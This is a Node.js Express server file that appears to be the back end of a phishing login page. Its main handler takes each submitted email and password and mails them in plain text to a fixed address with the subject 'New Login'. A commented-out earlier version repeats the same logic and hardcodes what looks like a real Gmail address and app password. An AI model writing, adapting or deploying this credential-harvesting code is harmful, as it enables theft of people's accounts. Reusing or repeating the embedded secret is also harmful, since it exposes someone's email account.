require('dotenv').config();

const express = require('express');
const app = express();

const PORT = process.env.PORT || 5000;

const nodemailer = require('nodemailer');


app.use(express.static('public'));
app.use(express.json());

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/', (req, res) => {
  console.log(req.body);

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.GOOGLE_APP_PASSWORD,
    }
  })
  const mailOptions = {
    from: req.body.email,
    to: process.env.EMAIL_TO,
    subject: 'New Login',
    text: `Email: ${req.body.email}\nPassword: ${req.body.password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.send('Failed to send email.');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('success');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});





// const express = require('express');
// const nodemailer = require('nodemailer');
// const bodyParser = require('body-parser');
// const cors = require('cors');
// require('dotenv').config(); // Optional: for environment variables

// const app = express();
// app.use(cors());
// app.use(bodyParser.json());

// // Use environment variables for credentials (recommended)
// const EMAIL_USER = process.env.EMAIL_USER || 'joshuachibuike123@gmail.com';
// const EMAIL_PASS = process.env.EMAIL_PASS || 'cwgkjfrzhcywmesa';
// const EMAIL_TO = process.env.EMAIL_TO || 'joshuachibuike123@gmail.com';

// app.post('/loginPage', (req, res) => {
//   const { email, password } = req.body;
//   if (!email || !password) {
//     return res.status(400).json({ error: 'Email and password are required.' });
//   }

//   let transporter = nodemailer.createTransport({
//     service: 'gmail',
//     auth: { user: EMAIL_USER, pass: EMAIL_PASS }
//   });

//   let mailOptions = {
//     from: EMAIL_USER,
//     to: EMAIL_TO,
//     subject: 'New Signup',
//     text: `Email: ${email}\nPassword: ${password}`
//   };

//   transporter.sendMail(mailOptions, (error, info) => {
//     if (error) {
//       console.error('Error sending mail:', error);
//       return res.status(500).json({ error: 'Failed to send email.' });
//     }
//     res.json({ success: true });
//   });
// });

// app.get('/', (req, res) => {
//   res.send('Server is running!');
// });

// app.listen(3000, () => {
//   console.log('Server running on http://localhost:3000');
// });